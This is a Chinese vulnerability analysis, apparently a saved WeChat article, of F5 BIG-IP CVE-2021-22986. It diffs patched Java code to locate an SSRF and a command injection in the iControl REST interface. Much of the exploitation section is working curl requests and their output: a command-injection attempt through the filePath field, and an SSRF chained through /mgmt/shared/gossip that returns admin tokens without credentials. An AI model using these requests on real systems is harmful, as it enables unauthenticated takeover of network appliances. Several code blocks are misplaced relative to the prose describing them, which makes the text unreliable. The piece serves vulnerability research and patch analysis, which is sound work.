> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/FoIKTWty4nK9Mljg23vzqg)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/wbFNMtoYNOvjia4pprLWibJ8r5Q5ibFfM11upDzm1woicC1YBtazRlc8ygLtoMZq1oxJIqL6BiaK8zyCK19iaDWw5AfQ/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/wbFNMtoYNOvjia4pprLWibJ8r5Q5ibFfM11oiaNTQQ0H97KcibqEPZG4NtfnecmaOCKhrwfbHEKAtVfughVo3rmA2xw/640?wx_fmt=jpeg)

在此简陋的分析下 F5 BIGIP CVE-2021-22986 漏洞以及利用方式。由于本人 Java 水平不是很高，如有错误，敬请指正。

**作者：维阵漏洞研究员 --w0lfzhang**

### **- 01 -**

### **漏洞概述**

前段时间 F5 的 BIGIP 爆出了一些漏洞，其中 CVE-2021-22986 是一个 pre-auth 的 RCE 漏洞，存在于其 iControl REST 接口。其影响以下 BIGIP 的版本：

```
...
<ProxyMatch /mgmt/>
    # Access is restricted to traffic from 127.0.0.1
    Require ip 127.0.0.1
    Require ip 127.4.2.2

    # This is an exact copy of the authentication settings of the document root.
    # If a connection is attempted from anywhere but 127.*.*.*, then it will have
    # to be authenticated.

    # we control basic auth via this file...
    IncludeOptional /etc/httpd/conf/basic_auth*.conf

    AuthName "Enterprise Manager"
    AuthPAM_Enabled on
    AuthPAM_ExpiredPasswordsSupport on
    require valid-user
</ProxyMatch>

RewriteEngine on
RewriteRule ^/mgmt$ /mgmt/ [PT]
RewriteRule ^/mgmt(/vmchannel/.*) $1 [PT]

# Don't proxy REST rpm endpoint requests.
ProxyPass /mgmt/rpm !
ProxyPass /mgmt/job !
ProxyPass /mgmt/endpoint !
# Proxy REST service bus requests.
# We always retry so if we restart the REST service bus, Apache
# will quickly re-discover it. (The default is 60 seconds.)
# If you have retry timeout > 0, Apache timers may go awry
# when clock is reset. It may never re-enable the proxy.
ProxyPass /vmchannel/ http://localhost:8585/vmchannel/ retry=0
ProxyPass /mgmt/ http://localhost:8100/mgmt/ retry=0
# Adjust URLs in HTTP response headers
ProxyPassReverse /vmchannel/ http://localhost:8585/vmchannel/
ProxyPassReverse /mgmt/ http://localhost:8100/mgmt/
...
```

在此特地简陋的分析下该漏洞以及利用方式。由于本人 Java 水平不是很高，如有错误，敬请指正。

**- 02 -**

### **漏洞定位**

因为官方是没有放出漏洞具体详情的，所以需要自己根据 patch 来定位漏洞。刚开始我用的 15.1.2 和 15.1.2.1 的版本进行 diff，没有 diff 出命令注入。后来换成 16.0.1 和 16.0.1.1 就 diff 出来了。所以本次分析用的是 bigip 16.0.1 和 16.0.1.1 的版本。 

官方说漏洞存在于 iControl REST 接口，

查阅下相关资料

(https://cdn.f5.com/websites/devcentral.f5.com/downloads/icontrol-rest-api-user-guide-14-1-0.pdf) 即可知如何访问该接口，默认是可通过 443 端口 / mgmt/xxx 路径进行访问。然后分析下 httpd.conf 可知对该路径的请求都会转发至 localhost:8100 进行处理：

```
[root@localhost:NO LICENSE:Standalone] config # ps aux |grep 8100
root      6138  0.6  5.4 451568 220732 ?       Sl   Mar24   6:21 
/usr/lib/jvm/jre/bin/java -Djava.util.logging.manager=com.f5.rest.common.RestLogManager -Djava.util.logging.config.file=/etc/restjavad.log.conf -Dlog4j.defaultInitOverride=true -Dorg.quartz.properties=/etc/quartz.properties -Xss384k -XX:+PrintFlagsFinal -Dsun.jnu.encoding=UTF-8 -Df.....
```

然后找到对应监听的主程序：

```
f5.rest.workers.authn.AuthnWorker:
protected void onPost(final RestOperation request) {
     final String incomingAddress = request.getRemoteSender();

     final AuthnWorkerState state = (AuthnWorkerState)request.getTypedBody(AuthnWorkerState.class);
     AuthProviderLoginState loginState = (AuthProviderLoginState)request.getTypedBody(AuthProviderLoginState.class);


-    if (state.password == null && state.bigipAuthCookie == null) {
+    if (Utilities.isNullOrEmpty(state.password) && Utilities.isNullOrEmpty(state.bigipAuthCookie)) {
       state.bigipAuthCookie = request.getCookie("BIGIPAuthCookie");
       loginState.bigipAuthCookie = state.bigipAuthCookie;
     }

     if (incomingAddress != null && incomingAddress != "Unknown") {
       loginState.address = incomingAddress;
     }

-    if ((state.username == null || state.password == null) && state.bigipAuthCookie == null) {
+    if ((Utilities.isNullOrEmpty(state.username) || Utilities.isNullOrEmpty(state.password)) && Utilities.isNullOrEmpty(state.bigipAuthCookie)) {
+
       request.setStatusCode(401);
       String msg = String.format("username and password must not be null or %s in Cookie header should be used.", new Object[] { "BIGIPAuthCookie" });

       request.fail(new SecurityException(msg));

+
       return;
     }

+    boolean isAllowedLinks = false;
+
+    if (state.loginReference != null && state.loginReference.link != null) {
+
+      for (URI iter : this.subscriptions.keySet()) {
+        if (state.loginReference.link.getPath().equals(iter.getPath())) {
+          isAllowedLinks = true;
+          break;
+        }
+      }
+      if (!isAllowedLinks) {
+        getLogger().severe("No login provider found.");
+        String msg = String.format("No login provider found.", new Object[0]);
+        request.fail(new SecurityException(msg));
+
+        return;
+      }
+    }
+
     state.password = null;
     request.setBody(state);
...

com.f5.rest.tmos.bigip.access.iapp.IAppBundleInstallTaskCollectionWorker:
+  private static final Pattern validFilePathChars = Pattern.compile("(^[a-zA-Z][a-zA-Z0-9_.\\-\\s()]*)\\.([tT][aA][rR]\\.[gG][zZ])$");
...
   private void validateGzipBundle(final IAppBundleInstallTaskState taskState) {
     if (Utilities.isNullOrEmpty(taskState.filePath)) {
       File agcUseCasePackDir = new File("/var/apm/f5-iappslx-agc-usecase-pack/");
       if (!agcUseCasePackDir.exists() || !agcUseCasePackDir.isDirectory()) {
         String error = "Access Guided Configuration use case pack not found on BIG-IP. Please upload and install the pack.";
         failTask(taskState, error, "");
         return;
       }
       File[] agcUseCasePack = agcUseCasePackDir.listFiles();
       if (agcUseCasePack == null || agcUseCasePack.length == 0 || !agcUseCasePack[0].isFile()) {

         String error = "Access Guided Configuration use case pack not found on BIG-IP. Please upload and install the pack.";
         failTask(taskState, error, "");
         return;
       }
       taskState.filePath = agcUseCasePack[0].getPath();
     }

+    String filename = taskState.filePath.substring(taskState.filePath.lastIndexOf('/') + 1);
+    Matcher m = validFilePathChars.matcher(filename);
+    if (!m.matches()) {
+      String errorMessage = String.format("Access Guided Configuration use case pack validation failed: the file name %s must begin with alphabet, and only contain letters, numbers, spaces and/or special characters (underscore (_), period (.), hyphen (-) and round brackets ()). Only a .tar.gz file is allowed", new Object[] { filename });
+
+
+
+      failTask(taskState, errorMessage, "");
+
+      return;
+    }
     final String extractTarCommand = "tar -xf " + taskState.filePath + " -O > /dev/null";


     ShellExecutor extractTar = new ShellExecutor(extractTarCommand);
...
```

分析该启动命令行可知，主类为 com.f5.rest.workers.RestWorkerHost，大致知道下相关的 jar 文件都位于 / usr/share/java/rest 目录下。在 diff 一些文件大小和时间经过改变的 jar 文件后，最终在 f5.rest.workers.authn.AuthnWorker 和 com.f5.rest.tmos.bigip.access.iapp.IAppBundleInstallTaskCollectionWorker 中发现了一些变化：

```
.......
  if (state.password == null && state.bigipAuthCookie == null) {
/* 323 */       state.bigipAuthCookie = request.getCookie("BIGIPAuthCookie");
/* 324 */       loginState.bigipAuthCookie = state.bigipAuthCookie;
/*     */     } 
/*     */     
/* 327 */     if (incomingAddress != null && incomingAddress != "Unknown") {
/* 328 */       loginState.address = incomingAddress;
/*     */     }
/*     */     
/* 331 */     if ((state.username == null || state.password == null) && state.bigipAuthCookie == null) {
/* 332 */       request.setStatusCode(401);
/* 333 */       String msg = String.format("username and password must not be null or %s in Cookie header should be used.", new Object[] { "BIGIPAuthCookie" });
/*     */       
/* 335 */       request.fail(new SecurityException(msg));
/*     */       
/*     */       return;
/*     */     } 
......
```

结合下该链接

(https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986) 的分析，可知第一个漏洞为一个 SSRF 漏洞。但是利用该漏洞有一些限制，稍后会提到。第二个漏洞为一个命令注入漏洞。

**- 03 -  
**

### **漏洞利用**

SSRF 影响的路径为

/mgmt/shared/authn/login，命令注入影响路径为 / mgmt/tm/access/bundle-install-tasks。

查看 f5.rest.workers.authn.AuthnWorker 类可知，在访问 / mgmt/shared/authn/login 路径的时候如果 POST 数据中有 loginReference 字段，且满足以下条件会把该请求连带 POST 数据转发至该 loginReference 字段的 link 路径。

```
/* 318 */     final AuthnWorkerState state = (AuthnWorkerState)request.getTypedBody(AuthnWorkerState.class);
/* 319 */     AuthProviderLoginState loginState = (AuthProviderLoginState)request.getTypedBody(AuthProviderLoginState.class);
              ......   
/* 503 */     RestOperation checkAuth = RestOperation.create().setBody(loginState).setUri(makeLocalUri(state.loginReference.link)).setCompletion(authCompletion);
/*     */ 
/*     */     
/* 506 */     sendPost(checkAuth);
/*     */   }
```

但是对该 POST 数据的字段是有白名单限制的。在转发该请求之前，请求的 POST 数据会被重新设置：

```
public class AuthProviderLoginState extends RestWorkerState {
  public String username;

  public String password;

  public String address;

  public String bigipAuthCookie;

  public String authProviderName;

  public RestReference userReference;

  public List<RestReference> groupReferences;
}
```

可以看到会根据 loginState 来进行 setbody，亦即设置 POST 数据。只允许 AuthProviderLoginState 的字段：

```
curl -ks https://192.168.190.136/mgmt/shared/authn/login -d 
'{"bigipAuthCookie":"","loginReference":{"link":"http://localhost/mgmt/tm/access/bundle-install-tasks"},"filePath":"`id`"}'
```

所以如果直接利用 SSRF 来进行命令注入的话，不符合的字段是传不到目标 url 的。

```
RestOperation checkAuth = RestOperation.create().setBody(loginState).setUri(makeLocalUri(state.loginReference.link)).setCompletion(authCompletion);

RestRequestCompletion authCompletion = new RestRequestCompletion()
/*     */       {
/*     */         
/*     */        ......
/*     */         public void completed(RestOperation operation) {
/* 483 */           AuthnWorker.this.loginFailureMap.remove(failureKey);
/*     */           
/* 485 */           AuthProviderLoginState loggedIn = (AuthProviderLoginState)operation.getTypedBody(AuthProviderLoginState.class);
/*     */ 
/*     */           
/* 488 */           String authProviderId = loggedIn.authProviderName;
/* 489 */           if (authProviderId == null) {
/* 490 */             authProviderId = (state.loginProviderName == null) ? state.loginReference.link.toString() : state.loginProviderName;
/*     */           }
/*     */ 
/*     */           
/* 494 */           AuthnWorker.this.getLogger().finestFmt("User %s successfully logged in from %s using the %s authentication provider.", new Object[] { loggedIn.username, this.val$incomingAddress, authProviderId });          
/* 499 */           AuthnWorker.generateToken(AuthnWorker.this.getServer(), request, state, loggedIn);
/*     */         }
/*     */       };
```

```
➜  CVE-2021-22986 ✗ curl -ks https://192.168.190.136/mgmt/shared/authn/login -d '{"bigipAuthCookie":"","loginReference":{"link":"http://localhost/mgmt/tm/access/bundle-install-tasks"},"filePath":"`id`"}'
{"code":400,"message":"request failed with null exception","referer":"192.168.190.1","restOperationId":7145511,"kind":":resterrorresponse"}
```

访问该 url(mgmt/tm/access/bundle-install-tasks) 返回的 json 数据会根据字段赋值给 loggedIn(class AuthProviderLoginState) 的各个字段：

![](https://mmbiz.qpic.cn/mmbiz_png/wbFNMtoYNOvjia4pprLWibJ8r5Q5ibFfM11qA5LgDc8FpxzCZ41ydRdBriaL9hGLQOThjBiawqBuKXZrhcBhrYoYEPA/640?wx_fmt=png)

然后就会调用 generateToken 函数，根据函数名以及分析可知该函数可以产生登录时的 token，然后用该 token 即可访问需要认证的资源。所以如果一切正常的话，上述访问应该给我们返回一个 token，但实际上返回的是以下内容：

```
/*     */   public static void generateToken(RestServer server, final RestOperation request, final AuthnWorkerState authState, AuthProviderLoginState loginState) {
/* 516 */     if (authState.needsToken != null && !authState.needsToken.booleanValue()) {
/* 517 */       request.setBody(authState);
/* 518 */       request.complete();
/*     */       
/*     */       return;
/*     */     } 
/* 522 */     AuthTokenItemState token = new AuthTokenItemState();
/* 523 */     token.userName = loginState.username;
/* 524 */     token.user = loginState.userReference;
/* 525 */     token.groupReferences = loginState.groupReferences;
/* 526 */     token.authProviderName = loginState.authProviderName;
/* 527 */     token.address = request.getXForwarderdFor();
......
/* 547 */     RestOperation createToken = RestOperation.create().setUri(UrlHelper.buildLocalUriSafe(server, new String[] { WellKnownPorts.AUTHZ_TOKEN_WORKER_URI_PATH })).setBody(token).setCompletion(tokenCompletion).setReferer("authn-generate-token");  <====
/*     */     
/* 553 */     RestRequestSender.sendPost(createToken);
......
```

```
➜  CVE-2021-22986 ✗ curl -ksu admin:xxx https://192.168.190.136/mgmt/shared/gossip -d '{"userReference":{"link"
:"xxx"}'
{"userReference":{"link":"xxx"}
```

传进去的 state.user 字段是在 generateToken 函数里面进行赋值的：

```
➜  CVE-2021-22986 ✗ curl -ks https://192.168.190.136/mgmt/shared/authn/login -d '{"username":"admin","bigipAuthCooki
e":"","userReference":{"link":""},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}'
{"username":"admin","bigipAuthCookie":"","loginReference":
{"link":"http://localhost/mgmt/shared/gossip"},"token":
{"token":"GFCDZ5OHG26QRMFKKETVAV2M6Q","name":"GFCDZ5OHG26QRMFKKETVAV2M6Q","userName":"admin","user":{"link":""},"timeout":1200,"startTime":"2021-03-25T07:51:35.742-0700","address":"192.168.190.1","partition":"
[All]","generation":1,"lastUpdateMicros":1616683895741691,"expirationMicros":1616685095742000,"kind":"shared:authz:tokens:authtokenitemstate","selfLink":"https://localhost/mgmt/shared/authz/tokens/GFCDZ5OHG26QRMFKKETVAV2M6Q"},"generation":0,"lastUpdateMicros":0}
```

根据前面分析可知，loginState 各字段的赋值来源于对目标 url 访问返回的 json 数据。而此时我们传进去的 userReference 字段是 null 的，所以触发了 state.user==null，获取 token 会失败，这是最根本的原因。

所以要想正常获取 token 需要我们利用 ssrf 访问的 url 返回的 json 数据包含 userReference 字段。只需要找到一个能返回 userReference 字段的 worker(url) 即可。

在经过查找后，

gossip worker(/mgmt/shared/gossip) 符合条件：

```
➜  CVE-2021-22986 git:(master) ✗ curl -ks https://192.168.190.136/mgmt/shared/authn/login -d '
{"username":"","bigipAuthCookie":"","userReference":
{"link":""},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}'
{"username":"","bigipAuthCookie":"","loginReference":
{"link":"http://localhost/mgmt/shared/gossip"},"token":
{"token":"F7B7234EB5G2DAZPKYZJZZE6I3","name":"F7B7234EB5G2DAZPKYZJZZE6I3","userName":"","user":{"link":""},"timeout":1200,"startTime":"2021-03-25T08:01:02.827-0700","address":"192.168.190.1","partition":"
[All]","generation":1,"lastUpdateMicros":1616684462826871,"expirationMicros":1616685662827000,"kind":"shared:authz:tokens:authtokenitemstate","selfLink":"https://localhost/mgmt/shared/authz/tokens/F7B7234EB5G2DAZPKYZJZZE6I3"},"generation":0,"lastUpdateMicros":0}
```

所以利用 ssrf 访问该 url 可正常获取 token：

```
➜  CVE-2021-22986 ✗ curl -ks https://192.168.190.136/mgmt/shared/authn/login -d '{"username":"admin","bigipAuthCooki
e":"","userReference":{"link":""},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}'
{"username":"admin","bigipAuthCookie":"","loginReference":
{"link":"http://localhost/mgmt/shared/gossip"},"token":
{"token":"GFCDZ5OHG26QRMFKKETVAV2M6Q","name":"GFCDZ5OHG26QRMFKKETVAV2M6Q","userName":"admin","user":{"link":""},"timeout":1200,"startTime":"2021-03-25T07:51:35.742-0700","address":"192.168.190.1","partition":"
[All]","generation":1,"lastUpdateMicros":1616683895741691,"expirationMicros":1616685095742000,"kind":"shared:authz:tokens:authtokenitemstate","selfLink":"https://localhost/mgmt/shared/authz/tokens/GFCDZ5OHG26QRMFKKETVAV2M6Q"},"generation":0,"lastUpdateMicros":0}
```